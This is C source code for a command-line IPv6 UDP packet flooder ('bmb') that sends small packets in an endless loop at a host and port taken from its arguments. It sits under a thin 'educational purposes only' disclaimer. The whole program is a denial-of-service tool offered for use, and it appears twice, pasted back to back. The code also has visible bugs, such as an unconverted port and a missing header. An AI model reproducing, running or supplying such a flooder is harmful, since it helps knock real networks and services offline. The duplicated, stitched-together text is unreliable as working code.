;this is for educational purposes only...;
;use at your own risk;
;tuffluck or gonullyourself.com is not responsible for whatever you do with this code or any code found from my GH profile;

#define BOMB_STRING "0123456789"
#define BOMB_SIZE 10
 
#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
 
struct sockaddr_in6 name6;
 
int echo_connect(char *, short);
int lookup6 (char *);
//int error;
 
int packets, start;
 
void
handle_exit ()
{
  printf ("Flood completed, %d packets sent, %d seconds, %d packets/sec\n",
          packets, time (NULL) - start, packets / (time (NULL) - start));
  exit (0);
}
 
int
lookup6 (char *addr)
{
  int xerror;
  struct addrinfo hints, *res;
 
 
  memset (&hints, 0, sizeof (hints));
  hints.ai_socktype = SOCK_STREAM;
  xerror = getaddrinfo (addr, NULL, &hints, &res);
 
  if (xerror)
    {
      fprintf (stderr, "%s - error resolving\n", addr);
      return 1;
    }
 
  memcpy (&name6, res->ai_addr, res->ai_addrlen);
  freeaddrinfo (res);
 
  return 0;
}
 
int echo_connect(char *server, short port)
{
   struct sockaddr_in sin;
   struct hostent *hp;
   int thesock;
   
   printf("Bombing %s, port %d\n", server, port);
 
 
      bzero ((char *) &name6, sizeof (struct sockaddr_in6));
      name6.sin6_family = AF_INET6;
      memcpy (&name6.sin6_addr, &in6addr_any, 16);
//      name6.sin6_port = htons (port);
      name6.sin6_port = port;
 
lookup6(server);
 
   thesock = socket(AF_INET6, SOCK_DGRAM, 0);
   connect(thesock,(struct sockaddr_in6 *) &name6, sizeof(struct sockaddr_in6));  
 
   return thesock;
}
                             
   
main(int argc, char **argv)
{
   int s;
   if(argc != 3)
   {
      printf("Syntax: bmb host port\n");
      printf("Port can be any port, any of them work equally well\n");
      exit(0);
   }
 
  signal (SIGINT, handle_exit);
  signal (SIGTERM, handle_exit);
  signal (SIGQUIT, handle_exit);
 
   s=echo_connect(argv[1], atoi(argv[2]));
 
printf("Acquired socket %d\n", s);
start = time(NULL);
packets=0;
   for(;;)
   {
      send(s, BOMB_STRING, BOMB_SIZE, 0);
      packets++;
   }
}#define BOMB_STRING "0123456789"
#define BOMB_SIZE 10
 
#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
 
struct sockaddr_in6 name6;
 
int echo_connect(char *, short);
int lookup6 (char *);
//int error;
 
int packets, start;
 
void
handle_exit ()
{
  printf ("Flood completed, %d packets sent, %d seconds, %d packets/sec\n",
          packets, time (NULL) - start, packets / (time (NULL) - start));
  exit (0);
}
 
int
lookup6 (char *addr)
{
  int xerror;
  struct addrinfo hints, *res;
 
 
  memset (&hints, 0, sizeof (hints));
  hints.ai_socktype = SOCK_STREAM;
  xerror = getaddrinfo (addr, NULL, &hints, &res);
 
  if (xerror)
    {
      fprintf (stderr, "%s - error resolving\n", addr);
      return 1;
    }
 
  memcpy (&name6, res->ai_addr, res->ai_addrlen);
  freeaddrinfo (res);
 
  return 0;
}
 
int echo_connect(char *server, short port)
{
   struct sockaddr_in sin;
   struct hostent *hp;
   int thesock;
   
   printf("Bombing %s, port %d\n", server, port);
 
 
      bzero ((char *) &name6, sizeof (struct sockaddr_in6));
      name6.sin6_family = AF_INET6;
      memcpy (&name6.sin6_addr, &in6addr_any, 16);
//      name6.sin6_port = htons (port);
      name6.sin6_port = port;
 
lookup6(server);
 
   thesock = socket(AF_INET6, SOCK_DGRAM, 0);
   connect(thesock,(struct sockaddr_in6 *) &name6, sizeof(struct sockaddr_in6));  
 
   return thesock;
}
                             
   
main(int argc, char **argv)
{
   int s;
   if(argc != 3)
   {
      printf("Syntax: bmb host port\n");
      printf("Port can be any port, any of them work equally well\n");
      exit(0);
   }
 
  signal (SIGINT, handle_exit);
  signal (SIGTERM, handle_exit);
  signal (SIGQUIT, handle_exit);
 
   s=echo_connect(argv[1], atoi(argv[2]));
 
printf("Acquired socket %d\n", s);
start = time(NULL);
packets=0;
   for(;;)
   {
      send(s, BOMB_STRING, BOMB_SIZE, 0);
      packets++;
   }
}
